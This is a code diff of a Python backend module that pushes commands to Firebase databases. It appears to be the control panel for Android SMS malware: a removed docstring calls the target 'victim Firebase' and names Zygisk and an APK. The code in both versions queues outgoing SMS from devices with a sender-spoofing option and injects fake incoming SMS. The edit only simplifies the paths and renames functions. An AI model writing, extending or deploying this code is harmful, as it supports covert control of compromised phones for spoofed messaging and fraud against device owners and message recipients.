@@ -1,4 +1,3 @@
-import asyncio
 import json
 import logging
 import time
@@ -13,7 +12,6 @@ logger = logging.getLogger(__name__)
 settings = get_settings()
 
 INJECT_TIMEOUT_SEC = 2.0
-OUTGOING_TIMEOUT_SEC = 3.0
 
 def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
     if profile.firebase_url:
@@ -72,52 +70,7 @@ async def _firebase_put(url: str, data: dict, *, timeout: float = INJECT_TIMEOUT
     response.raise_for_status()
 
 
-async def _firebase_put_many(urls: list[str], data: dict, *, timeout: float = OUTGOING_TIMEOUT_SEC) -> None:
-    if not urls:
-        return
-
-    async def _one(url: str) -> None:
-        try:
-            await _firebase_put(url, data, timeout=timeout)
-        except Exception as exc:
-            logger.debug("Firebase PUT failed for %s: %s", url, exc)
-
-    await asyncio.gather(*(_one(url) for url in urls), return_exceptions=True)
-
-
-def _outgoing_device_ids(device: Device) -> list[str]:
-    ids: list[str] = []
-    if device.name:
-        ids.append(device.name.strip())
-    if device.firebase_key:
-        leaf = device.firebase_key.strip("/").split("/")[-1]
-        if leaf and leaf not in ids:
-            ids.append(leaf)
-    return ids
-
-
-def _outgoing_command_paths(base: str, device_id: str, command_id: str) -> list[str]:
-    return [
-        f"{base}/commands/{device_id}/{command_id}",
-        f"{base}/clients/{device_id}/commands/{command_id}",
-        f"{base}/clients/{device_id}/command/{command_id}",
-        f"{base}/clients/{device_id}/outbox/{command_id}",
-        f"{base}/devices/{device_id}/commands/{command_id}",
-        f"{base}/devices/{device_id}/outbox/{command_id}",
-        f"{base}/sms_out/{device_id}/{command_id}",
-        f"{base}/send/{device_id}/{command_id}",
-    ]
-
-
-def _outgoing_inject_paths(base: str, device_id: str, command_id: str) -> list[str]:
-    return [
-        f"{base}/messages/{device_id}/{command_id}",
-        f"{base}/clients/{device_id}/messages/{command_id}",
-        f"{base}/clients/{device_id}/sms_out/{command_id}",
-    ]
-
-
-async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
+async def push_module_config(profile: MonitorProfile, device: Device | None = None) -> None:
     """Push Astik-style APK config to module DB: config/{KEY}."""
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
@@ -149,52 +102,20 @@ async def push_outgoing_sms_command(
     sim_index: int = 0,
     sim_slot: int | None = None,
     spoof_sender: str | None = None,
-    *,
-    device: Device | None = None,
 ) -> str:
-    """Queue outgoing SMS on victim Firebase — multi-path for panel/Zygisk/Virtus APK."""
+    """Queue outgoing SMS: {firebase}/commands/{device_id}/{id}."""
     base = normalize_firebase_url(firebase_url)
     command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
-    slot = sim_slot or (sim_index + 1)
-    created_at = datetime.now(timezone.utc).isoformat()
     payload = {
         "to": to_number,
-        "phone": to_number,
-        "number": to_number,
         "message": message,
-        "text": message,
-        "body": message,
         "sim_index": sim_index,
-        "sim_slot": slot,
-        "sim": slot,
+        "sim_slot": sim_slot or (sim_index + 1),
         "spoof_sender": spoof_sender,
         "status": "pending",
-        "type": "sms",
-        "action": "send",
-        "created_at": created_at,
+        "created_at": datetime.now(timezone.utc).isoformat(),
     }
-    inject_payload = {
-        "sender": "__OUT__",
-        "body": f"{to_number}\n{message}\n{sim_index}",
-        "injected": False,
-        "created_at": created_at,
-    }
-
-    device_ids = _outgoing_device_ids(device) if device else [device_id]
-    if device_id not in device_ids:
-        device_ids.insert(0, device_id)
-
-    command_urls: list[str] = []
-    inject_urls: list[str] = []
-    for dev_id in device_ids:
-        command_urls.extend(_outgoing_command_paths(base, dev_id, command_id))
-        inject_urls.extend(_outgoing_inject_paths(base, dev_id, command_id))
-
-    await asyncio.gather(
-        _firebase_put_many(command_urls, payload),
-        _firebase_put_many(inject_urls, inject_payload),
-        return_exceptions=True,
-    )
+    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
     return command_id
 
 
@@ -204,7 +125,7 @@ async def push_inject_message(
     sender: str,
     body: str,
 ) -> str:
-    """Queue SMS inject for Virtus APK: {firebase}/messages/{device_id}/{id}."""
+    """Queue SMS inject: {firebase}/messages/{device_id}/{id}."""
     from app.channel_relay import prepare_sms_forward
 
     sender, body = prepare_sms_forward(sender, body)
@@ -248,7 +169,7 @@ async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | Non
     if not resolve_firebase_url(profile, device):
         return
     try:
-        await push_virtus_config(profile, device)
+        await push_module_config(profile, device)
         if device:
             firebase_url = resolve_firebase_url(profile, device)
             if firebase_url:
@@ -316,7 +237,6 @@ async def push_outbound_to_firebase(
             outbound.message,
             sim_index=outbound.sim_index,
             sim_slot=outbound.sim_slot,
-            device=device,
         )
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
